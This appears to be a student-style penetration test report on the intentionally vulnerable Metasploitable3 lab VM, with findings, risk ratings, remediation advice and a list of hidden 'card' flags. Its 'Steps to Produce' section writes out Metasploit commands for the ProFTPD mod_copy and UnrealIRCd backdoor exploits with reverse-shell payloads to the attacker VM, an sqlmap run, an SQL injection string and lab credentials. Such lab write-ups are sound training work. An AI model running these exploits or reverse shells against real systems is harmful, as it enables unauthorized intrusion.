# 🛡️ Metasploitable 3 Penetration Test Report

**Confidential Report**  
**Assessment Period:** September 20–22, 2025  
**Prepared by:** Studsvike Technologies  
**Contact:** info@studsvike.com | +254 725 689 456  

---

## 🧾 Table of Contents
1. [Non-Disclosure Statement & Legal Notice](#non-disclosure-statement--legal-notice)
2. [Executive Summary](#executive-summary)
3. [Scope](#scope)
4. [Methodology](#methodology)
5. [Risk Rankings](#risk-rankings)
6. [Findings & Evidences](#findings--evidences)
7. [Recommendations](#recommendations)
8. [Steps to Produce](#steps-to-produce)
9. [Cards Found](#cards-found)
10. [Conclusion](#conclusion)
11. [Contact Information](#contact-information)
12. [Bibliography](#bibliography)

---

## 1. Non-Disclosure Statement & Legal Notice

### Non-Disclosure
This report is **confidential** and proprietary to Metasploitable and Studsvike Technologies. Unauthorized use or distribution is strictly prohibited.

### Legal Notice
This report is provided *“as is”* with no warranties. Studsvike Technologies is not liable for damages resulting from the use or misuse of this information.

---

## 2. Executive Summary

This penetration test targeted the **Metasploitable3-Linux VM** in a controlled environment.  
The objective was to:
- Identify vulnerabilities,
- Exploit weaknesses,
- Gain system access,
- Escalate privileges, and
- Retrieve card images as proof of compromise.

### Key Results
- Multiple vulnerabilities found in FTP, IRC, MySQL, and web applications.  
- Full system compromise achieved through **UnrealIRCd backdoor** and **SQL injection**.  
- All flag objectives successfully collected.

---

## 3. Scope

| Parameter | Description |
|------------|-------------|
| **Period** | September 20–21, 2025 |
| **Attacker VM** | Kali Linux (10.0.2.8) |
| **Target VM** | Metasploitable3-Linux (10.0.2.9) |
| **Services Tested** | FTP, SSH, Apache, Drupal, phpMyAdmin, MySQL, Samba, UnrealIRCd |
| **Excluded Activities** | DoS, phishing, physical access, third-party systems |

---

## 4. Methodology

Testing followed **PTES**, **OWASP**, and **NIST SP 800-30** frameworks.

### Phases
1. Reconnaissance & Enumeration (`nmap`, `gobuster`, `curl`)
2. Vulnerability Analysis
3. Exploitation (`Metasploit`, `sqlmap`)
4. Privilege Escalation
5. Validation & Reporting

### Tools
`nmap`, `gobuster`, `sqlmap`, `Metasploit`, `Wireshark`, `binwalk`, `exiftool`, `nc`, `zbarimg`

---

## 5. Risk Rankings

| ID | Finding | Likelihood | Impact | Risk | CVSS |
|----|----------|-------------|---------|------|------|
| R1 | ProFTPD 1.3.5 – FTP writable | High | High | **High** | 8.9 |
| R2 | Samba SMB – writable shares | High | High | **Medium** | 6.9 |
| R3 | Apache HTTP – directory listings | High | Medium | **High** | 8.0 |
| R4 | MySQL – weak credentials | Medium | Medium | **High** | 7.0 |
| R5 | Jetty HTTP – outdated libraries | Medium | Medium | **Medium** | 6.0 |
| R6 | UnrealIRCd – backdoor | Medium | High | **Critical** | 9.0 |

---

## 6. Findings & Evidences

### 6.1 Network Discovery
Open ports identified on 10.0.2.9:
21, 22, 80, 445, 631, 3306, 3500, 6697, 8080


### 6.2 ProFTPD 1.3.5 (Port 21)
- Vulnerable to **mod_copy** exploit.  
- Risk: High (CVSS 8.0)

### 6.3 Apache HTTP (Port 80)
- Default page exposed.
- Directory listing enabled.
- Risk: High (CVSS 8.0)

### 6.4 Samba SMB (Port 445)
- Valid credentials found: `chewbacca:rwaaaaawr5`
- Risk: High (CVSS 6.9)

### 6.5 MySQL 5.5.58 (Port 3306)
- SQL Injection in `payroll_app.php` via `' OR 1=1#`
- Risk: High (CVSS 7.0)

### 6.6 UnrealIRCd 3.2.8.1 (Port 6697)
- Known backdoor allows remote command execution.
- Access gained as user `boba_fett`.
- Escalated privileges to **root**.
- Risk: **Critical (CVSS 9.0)**

---

## 7. Recommendations

### Immediate (0–3 Days)
| Issue | Action |
|-------|---------|
| Weak Credentials | Enforce strong password policy |
| Unpatched Services | Update ProFTPD, Apache, UnrealIRCd |
| Writable SMB Shares | Restrict permissions |
| Exposed Admin Interfaces | Bind to localhost / enable TLS |
| Weak Logging | Enable SIEM alerts |

### Mid-Term (14–45 Days)
- Harden configurations using CIS benchmarks.  
- Introduce **MFA** for admin access.  
- Enforce **network segmentation**.

### Long-Term (90+ Days)
- Adopt **secure SDLC** practices.  
- Implement continuous vulnerability testing.  
- Develop **Incident Response Playbooks**.

---

## 8. Steps to Produce

### Network Discovery
```bash
nmap -sV -p- -sC 10.0.2.9 -vv

ProFTPD Exploitation
msf6> use exploit/unix/ftp/proftpd_modcopy_exec
msf6> set RHOSTS 10.0.2.9
msf6> set SITEPATH /var/www/html/
msf6> set PAYLOAD cmd/unix/reverse_netcat
msf6> set LHOST 10.0.2.8
msf6> exploit

SQL Injection (Payroll App)
sqlmap -u "http://10.0.2.9/payroll_app.php" --data="user=admin&password=admin&s=OK"

UnrealIRCd Backdoor
msf6> use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6> set RHOSTS 10.0.2.9
msf6> set RPORT 6697
msf6> set PAYLOAD cmd/unix/reverse
msf6> set LHOST 10.0.2.8
msf6> exploit

9. Cards Found
Card	Location / Method
3 of Hearts	/lost+found/3_of_hearts.png (root-only)
5 of Hearts	Drupal /sites/default/files/field/image/ (Base64 in EXIF)
7 of Diamonds	Extracted from ZIP > GIF > QR > decoded hex
8 of Clubs	/home/anakin_skywalker/.../8_of_clubs.png
9 of Diamonds	Mounted ISO inside Kylo Ren’s .secret_files/
10 of Spades	Found in readme_app/images/
10 of Clubs	Extracted hidden file from .wav container
Ace of Clubs	Decoded Base64 in chat_client.js
King of Spades	Decoded Base64 block from ircd.motd
10. Conclusion

Metasploitable3’s configuration demonstrates realistic vulnerabilities seen in legacy systems:

Outdated software and weak credentials enabled multiple exploits.

Despite limited protections, attackers achieved root-level control.

Applying patch management, hardening, and continuous testing would significantly reduce exposure.

Key Takeaways

Patch management is critical.

Remove default accounts.

Implement centralized monitoring.

Enforce least privilege and segmentation.

11. Contact Information

Studsvike Technologies
📧 nicholas.oyaro@student.moringaschool.com

🌐 www.studsvike.com

📞 +254 720 075 564

Report Author:
Nicholas Oyaro – Lead Security Consultant

12. Bibliography

Metasploitable3

Metasploit Framework

Exploit Database

OWASP Testing Guide

NIST SP 800-30

Wireshark

Hydra

Gobuster
